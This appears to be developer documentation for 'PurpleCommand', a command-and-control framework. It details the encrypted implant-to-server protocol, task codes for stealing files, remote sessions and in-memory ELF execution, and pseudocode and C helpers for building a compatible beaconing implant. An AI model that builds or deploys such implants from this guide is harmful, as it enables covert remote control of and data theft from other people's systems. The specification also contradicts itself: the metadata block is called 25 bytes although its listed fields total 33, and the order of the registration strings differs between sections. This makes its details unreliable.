# PurpleCommand Implant Protocol Documentation

## Table of Contents
1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Cryptographic Layer](#cryptographic-layer)
4. [Message Types](#message-types)
5. [Packet Structure](#packet-structure)
6. [Communication Flow](#communication-flow)
7. [Command Codes](#command-codes)
8. [Implementation Guide](#implementation-guide)
9. [Wire Format Examples](#wire-format-examples)

---

## Overview

PurpleCommand uses a custom binary protocol for C2 (Command and Control) communication between implants and the server. The protocol is designed for:
- **Stealth**: Encrypted traffic with RSA + AES-CBC encryption
- **Integrity**: HMAC-SHA256 authentication
- **Flexibility**: Supports multiple implant types and commands
- **Efficiency**: Binary format with minimal overhead

### Key Features
- RSA-2048 encryption for key exchange during registration
- AES-128-CBC encryption for all subsequent communications
- HMAC-SHA256 (truncated to 16 bytes) for message authentication
- Base64 encoding for transport
- Big-endian byte order for all multi-byte integers

---

## Architecture

### Components
1. **Implant**: Agent running on target system
2. **C2 Server**: Command and control server
3. **Transport**: HTTP/HTTPS (GET/POST)

### Communication Pattern
```
Implant                           C2 Server
   |                                  |
   |--- (1) Registration (POST) ----->|
   |<--- (acknowledgment) ------------|
   |                                  |
   |--- (2) Check-in (GET) ---------->|
   |<--- (3) Task or Empty ------------|
   |                                  |
   |--- (4) Response (POST) --------->|
   |<--- (acknowledgment) ------------|
   |                                  |
   [Loop steps 2-4]
```

---

## Cryptographic Layer

### Phase 1: Registration (RSA)
During registration, the implant:
1. Generates a random AES-128 key (16 bytes)
2. Generates a random AES IV (16 bytes)
3. Encrypts the registration packet with server's RSA public key
4. Base64-encodes the encrypted data
5. POST to registration endpoint

### Phase 2: Operational (AES + HMAC)
After registration, all communication uses:
1. **AES-128-CBC** encryption with the shared key/IV
2. **HMAC-SHA256** (truncated to 16 bytes) appended to encrypted data
3. Base64 encoding for transport

### Encryption Process
```
Original Data → AES-CBC Encrypt → Append HMAC(16 bytes) → Base64 Encode → HTTP Transport
```

### Decryption Process
```
HTTP Transport → Base64 Decode → Verify HMAC → Remove HMAC → AES-CBC Decrypt → Original Data
```

---

## Message Types

The protocol defines 5 message types (identified by uint16 code):

| Code | Name | Direction | Description |
|------|------|-----------|-------------|
| 0 | NIL | - | Nothing/Invalid |
| 1 | REG | Implant → C2 | Initial registration |
| 2 | CHK | Implant → C2 | Check-in (health check) |
| 3 | RSP | Implant → C2 | Task response |
| 4 | CHU | Implant → C2 | Chunked file data |

### Task Message (C2 → Implant)
Task messages are sent from C2 to implant in response to CHK messages. Structure:
```
[TaskCode: uint16][TaskID: 8 bytes][PayloadLen: uint32][Payload: variable]
```

---

## Packet Structure

### Common Metadata Block (25 bytes)
All implant messages (except registration encryption layer) contain this metadata:

```
Offset | Size | Type   | Field      | Description
-------|------|--------|------------|----------------------------------
0      | 2    | uint16 | MessageType| REG, CHK, RSP, or CHU
2      | 4    | uint32 | PID        | Process ID
6      | 4    | uint32 | SessionID  | Unique session identifier
10     | 12   | [12]byte| OTS       | One-Time Secret (reserved)
22     | 4    | uint32 | IP         | IP address (big-endian)
26     | 2    | uint16 | Port       | Port number
28     | 4    | uint32 | Sleep      | Sleep interval (seconds)
32     | 1    | uint8  | Arch       | Architecture (0=nil, 1=amd64)
```

### 1. REG (Registration) - Before Encryption
```
[MessageType: uint16] = 1
[Metadata: 25 bytes]
[AES Key: 16 bytes]
[AES IV: 16 bytes]
[DataLen: uint16]
[Data: variable]
   └─ Hostname\x00User\x00Process\x00ImplantType\x00
```

**Data Section** is null-byte separated strings:
- Process name (e.g., "sshd")
- Hostname (e.g., "webserver01")
- Username (e.g., "www-data")
- Implant type (e.g., "impl")

**Encryption**: Entire packet is RSA-encrypted, then Base64-encoded.

**HTTP**: POST to registration endpoint (default: `/`)

### 2. CHK (Check-in)
```
[MessageType: uint16] = 2
[Metadata: 25 bytes]
```

**Encryption**: AES-CBC encrypt → Append HMAC(16 bytes) → Base64 encode

**HTTP**: GET request with Base64 data as parameter or body

### 3. RSP (Response)
```
[MessageType: uint16] = 3
[Metadata: 25 bytes]
[TaskID: 8 bytes]
[PayloadLen: uint32]
[Payload: variable bytes]
```

**Encryption**: AES-CBC encrypt → Append HMAC(16 bytes) → Base64 encode

**HTTP**: POST to default endpoint

### 4. CHU (Chunk/File Download)
```
[MessageType: uint16] = 4
[Metadata: 25 bytes]
[TaskID: 8 bytes]
[FileNameLen: uint32]
[FileName: variable bytes]
[ContentLen: uint32]
[Content: variable bytes]
```

**Encryption**: AES-CBC encrypt → Append HMAC(16 bytes) → Base64 encode

**HTTP**: POST to default endpoint

### 5. Task (C2 → Implant)
```
[TaskCode: uint16]
[TaskID: 8 bytes]
[PayloadLen: uint32]
[Payload: variable bytes]
```

**Encryption**: AES-CBC encrypt → Append HMAC(16 bytes) → Base64 encode

**HTTP**: Response to GET request (during CHK)

---

## Communication Flow

### Step-by-Step: Initial Registration

1. **Implant Startup**
   - Generate metadata (PID, SessionID, hostname, user, etc.)
   - Initialize crypto: generate AES key and IV
   - Embed or load server's RSA public key

2. **Build Registration Packet**
   ```
   packet = [REG][Metadata][AES_Key][AES_IV][DataLen][Data]
   ```

3. **Encrypt with RSA**
   ```
   encrypted = RSA_Encrypt(server_public_key, packet)
   ```

4. **Encode and Send**
   ```
   base64_data = Base64_Encode(encrypted)
   HTTP_POST(registration_url, base64_data)
   ```

5. **C2 Server Response**
   - Server decrypts with RSA private key
   - Extracts AES key/IV and stores for session
   - Returns acknowledgment (typically empty or success message)

### Step-by-Step: Check-in/Tasking Loop

1. **Build Check-in Packet**
   ```
   packet = [CHK][Metadata]
   ```

2. **Encrypt and Authenticate**
   ```
   encrypted = AES_CBC_Encrypt(packet, key, iv)
   authenticated = encrypted + HMAC_SHA256(encrypted, hmac_key)[:16]
   base64_data = Base64_Encode(authenticated)
   ```

3. **Send Check-in**
   ```
   response = HTTP_GET(c2_url, base64_data)
   ```

4. **Receive Response**
   - If empty or short (< 16 bytes): No tasks, sleep and loop
   - If data present:
     ```
     encrypted_data = Base64_Decode(response)
     verify HMAC (last 16 bytes)
     ciphertext = encrypted_data[:-16]
     plaintext = AES_CBC_Decrypt(ciphertext, key, iv)
     [TaskCode, TaskID, PayloadLen, Payload] = Parse(plaintext)
     ```

5. **Execute Task**
   - Execute command based on TaskCode
   - Collect output/result

6. **Send Response**
   ```
   packet = [RSP][Metadata][TaskID][ResultLen][Result]
   encrypted = AES_CBC_Encrypt(packet, key, iv)
   authenticated = encrypted + HMAC_SHA256(encrypted, hmac_key)[:16]
   base64_data = Base64_Encode(authenticated)
   HTTP_POST(c2_url, base64_data)
   ```

7. **Sleep and Loop**
   ```
   Sleep(implant.Sleep seconds)
   Goto step 1
   ```

---

## Command Codes

Task codes sent from C2 to implant:

| Code | Name    | Payload Format | Description |
|------|---------|----------------|-------------|
| 0    | NILCMD  | (none) | Invalid/No command |
| 1    | PING    | UTF-8 string | Echo test - implant appends " pong" |
| 2    | SSH     | (varies) | SSH interactive session |
| 3    | DOWN    | UTF-8 filename | Download file from target to C2 |
| 4    | UPL     | See below | Upload file from C2 to target |
| 5    | KILL    | (none) | Terminate implant |
| 6    | CD      | UTF-8 path | Change working directory |
| 7    | PWD     | (none) | Print working directory |
| 8    | LS      | UTF-8 path (optional) | List directory contents |
| 9    | MEMEXEC | See below | Execute ELF binary in memory |

### Payload Formats

#### PING (Code 1)
```
Payload: UTF-8 string (e.g., "test")
Response: string + " pong" (e.g., "test pong")
```

#### DOWN (Code 3) - Download file from target
```
Payload: UTF-8 filename path
Response: CHU packet with file contents
```

#### UPL (Code 4) - Upload file to target
```
Offset | Size    | Field
-------|---------|------------------
0      | 2       | NameLen (uint16)
2      | NameLen | Name (UTF-8 string)
2+N    | 4       | DataLen (uint32)
6+N    | DataLen | Data (binary)
```

#### CD (Code 6)
```
Payload: UTF-8 directory path
Response: Success message with new path or error
```

#### LS (Code 8)
```
Payload: UTF-8 directory path (empty = current dir)
Response: Formatted directory listing with permissions, owner, size, name
```

#### MEMEXEC (Code 9) - Execute ELF in memory
```
Offset | Size    | Field
-------|---------|------------------
0      | 2       | ArgsLen (uint16)
2      | ArgsLen | Arguments (space-separated UTF-8)
2+A    | Rest    | ELF binary data
```
**Response**: stdout/stderr output from execution

---

## Implementation Guide

### Minimum Requirements for a Compatible Implant

#### 1. Metadata Structure
```c
struct ImplantMetadata {
    uint32_t pid;        // Process ID
    uint32_t session_id; // Random 5-digit number
    uint8_t  ots[12];    // One-time secret (can be zeros)
    uint32_t ip;         // IP address (big-endian)
    uint16_t port;       // Port number
    uint32_t sleep;      // Sleep interval in seconds
    uint8_t  arch;       // 0=nil, 1=amd64
    char*    proc;       // Process name
    char*    hostname;   // Hostname
    char*    user;       // Username
    char*    type;       // Implant type identifier
};
```

#### 2. Crypto Functions Required
- **RSA-2048 PKCS#1 v1.5** encryption (registration only)
- **AES-128-CBC** encryption/decryption
- **HMAC-SHA256** (truncate to 16 bytes)
- **Base64** encoding/decoding

#### 3. Implementation Steps

**A. Initialization**
```pseudocode
1. Initialize metadata (collect system info)
2. Generate random session_id (5 digits)
3. Generate AES key (16 random bytes)
4. Generate AES IV (16 random bytes)
5. Derive HMAC key from AES key (or use same key)
6. Load embedded RSA public key
```

**B. Registration**
```pseudocode
1. Build packet:
   - MessageType = 1 (REG)
   - Metadata (25 bytes)
   - AES Key (16 bytes)
   - AES IV (16 bytes)
   - DataLen (2 bytes)
   - Data (proc\x00hostname\x00user\x00type)

2. Encrypt with RSA public key
3. Base64 encode
4. POST to server
```

**C. Main Loop**
```pseudocode
loop forever:
    // Check-in
    packet = build_checkin(CHK, metadata)
    encrypted = aes_cbc_encrypt(packet, key, iv)
    authed = encrypted + hmac_sha256(encrypted, key)[:16]
    encoded = base64_encode(authed)
    
    response = http_get(server_url, encoded)
    
    if len(response) < 16:
        sleep(metadata.sleep)
        continue
    
    // Decrypt task
    decoded = base64_decode(response)
    if not verify_hmac(decoded):
        error("HMAC verification failed")
        continue
    
    ciphertext = decoded[:-16]
    plaintext = aes_cbc_decrypt(ciphertext, key, iv)
    
    task_code, task_id, payload = parse_task(plaintext)
    
    // Execute task
    result = execute_command(task_code, payload)
    
    // Send response
    resp_packet = build_response(RSP, metadata, task_id, result)
    encrypted = aes_cbc_encrypt(resp_packet, key, iv)
    authed = encrypted + hmac_sha256(encrypted, key)[:16]
    encoded = base64_encode(authed)
    
    http_post(server_url, encoded)
    
    sleep(metadata.sleep)
```

#### 4. Binary Serialization (Big-Endian)
All multi-byte integers use **big-endian** byte order:

```c
// Write uint16
void write_uint16(uint8_t* buf, uint16_t val) {
    buf[0] = (val >> 8) & 0xFF;
    buf[1] = val & 0xFF;
}

// Write uint32
void write_uint32(uint8_t* buf, uint32_t val) {
    buf[0] = (val >> 24) & 0xFF;
    buf[1] = (val >> 16) & 0xFF;
    buf[2] = (val >> 8) & 0xFF;
    buf[3] = val & 0xFF;
}

// Read uint16
uint16_t read_uint16(uint8_t* buf) {
    return ((uint16_t)buf[0] << 8) | buf[1];
}

// Read uint32
uint32_t read_uint32(uint8_t* buf) {
    return ((uint32_t)buf[0] << 24) | 
           ((uint32_t)buf[1] << 16) |
           ((uint32_t)buf[2] << 8) | 
           buf[3];
}
```

---

## Wire Format Examples

### Example 1: Registration Packet (Before RSA Encryption)

```
Hex dump of registration packet:
00 01           # MessageType = REG (1)
00 00 12 34     # PID = 4660
00 01 23 45     # SessionID = 74565
00 00 00 00 00 00 00 00 00 00 00 00  # OTS (12 bytes)
C0 A8 01 0A     # IP = 192.168.1.10
1F 90           # Port = 8080
00 00 00 0A     # Sleep = 10 seconds
01              # Arch = amd64
A1 B2 C3 ... (16 bytes)  # AES Key
D4 E5 F6 ... (16 bytes)  # AES IV
00 1F           # DataLen = 31
73 73 68 64     # "sshd"
00              # separator
77 65 62 73 65 72 76 65 72 30 31  # "webserver01"
00              # separator
72 6F 6F 74     # "root"
00              # separator
69 6D 70 6C     # "impl"
```

After RSA encryption → Base64 encoding → POST body

### Example 2: Check-in Packet (After AES+HMAC)

**Original packet:**
```
00 02           # MessageType = CHK (2)
00 00 12 34     # PID
00 01 23 45     # SessionID
... (rest of metadata)
```

**After AES-CBC encryption (example):**
```
B3 7F 9A 2C ... (32 bytes encrypted)
```

**After HMAC append:**
```
B3 7F 9A 2C ... (32 bytes encrypted)
5D 8A 3F ... (16 bytes HMAC)
```

**After Base64 encoding:**
```
sz+aLC4xQv... (Base64 string)
```

This is sent as GET parameter or body.

### Example 3: Task from C2 (ls command)

**Original task packet:**
```
00 08           # TaskCode = LS (8)
41 42 43 44 45 46 47 48  # TaskID (8 bytes)
00 00 00 09     # PayloadLen = 9
2F 74 6D 70 2F 74 65 73 74  # "/tmp/test"
```

**After AES+HMAC+Base64** → Sent as response to GET request

### Example 4: Response Packet

**Original response:**
```
00 03           # MessageType = RSP (3)
... (metadata 25 bytes)
41 42 43 44 45 46 47 48  # TaskID (matching task)
00 00 00 10     # PayloadLen = 16
64 72 77 78 72 2D 78 72 2D 78 ... # "drwxr-xr-x ..."
```

**After AES+HMAC+Base64** → POST to server

---

## Security Considerations

### Key Points:
1. **RSA Key**: Server's public key must be embedded in the implant
2. **AES Key**: Generated once per implant session, shared during registration
3. **HMAC Key**: Uses AES key (or derive separately)
4. **Session ID**: Random 5-digit number (10000-99999)
5. **Base64**: Standard encoding, no URL-safe variant needed

### Implementation Notes:
- All encryption uses **PKCS#7 padding** for AES-CBC
- HMAC uses full SHA256 but **truncates to 16 bytes**
- RSA uses **PKCS#1 v1.5 padding**
- No replay protection implemented (rely on HMAC + session management)

---

## Implant Type Definitions (Lua Script)

From the Lua configuration, the implant type "impl" supports these commands:

| Command  | Code | Description |
|----------|------|-------------|
| ping     | 1    | Ping the implant |
| ssh      | 2    | Get an interactive session |
| download | 3    | Download a file from target |
| upload   | 4    | Upload a file to target |
| kill     | 5    | Kill implant |
| pwd      | 7    | Get working directory |
| cd       | 6    | Change directory |
| ls       | 8    | List directory |
| memexec  | 9    | Execute binary in memory |

### Lua Callback Functions (Optional)
The C2 server can define Lua callbacks for implant lifecycle events:
- `OnRegister(name, uuid, hostname, user, socket)` - Called when implant registers
- `OnCheck(name, uuid, hostname, user, data, task)` - Called on check-in
- `OnResponse(name, uuid, hostname, user, response, task)` - Called on task response

---

## Testing Your Implant

### Test Checklist:
1. ✓ Can generate valid registration packet
2. ✓ RSA encryption works with server's public key
3. ✓ AES-CBC encryption/decryption works
4. ✓ HMAC generation matches (16-byte truncation)
5. ✓ Base64 encoding/decoding
6. ✓ Big-endian serialization
7. ✓ HTTP communication (GET/POST)
8. ✓ Task parsing and execution
9. ✓ Sleep/loop mechanism

### Debug Tips:
- Print Base64 of registration packet before sending
- Verify AES key/IV are exactly 16 bytes
- Check byte order (big-endian required)
- Ensure HMAC uses first 16 bytes of SHA256 output
- Test with verbose logging enabled on C2 server

---

## References

- **RSA**: RFC 8017 (PKCS#1 v2.2)
- **AES-CBC**: NIST SP 800-38A
- **HMAC**: RFC 2104
- **Base64**: RFC 4648

---

## Appendix: Quick Reference

### Message Type Codes
```
NIL = 0, REG = 1, CHK = 2, RSP = 3, CHU = 4
```

### Task Codes
```
NILCMD = 0, PING = 1, SSH = 2, DOWN = 3, UPL = 4,
KILL = 5, CD = 6, PWD = 7, LS = 8, MEMEXEC = 9
```

### Architecture Codes
```
NILARCH = 0, AMD64 = 1
```

### Data Sizes
```
MessageType: 2 bytes
PID: 4 bytes
SessionID: 4 bytes
OTS: 12 bytes
IP: 4 bytes
Port: 2 bytes
Sleep: 4 bytes
Arch: 1 byte
TaskID: 8 bytes
AES Key: 16 bytes
AES IV: 16 bytes
HMAC: 16 bytes (truncated SHA256)
```

---

**Document Version:** 1.0  
**Last Updated:** May 2, 2026  
**Protocol Version:** PurpleCommand v1
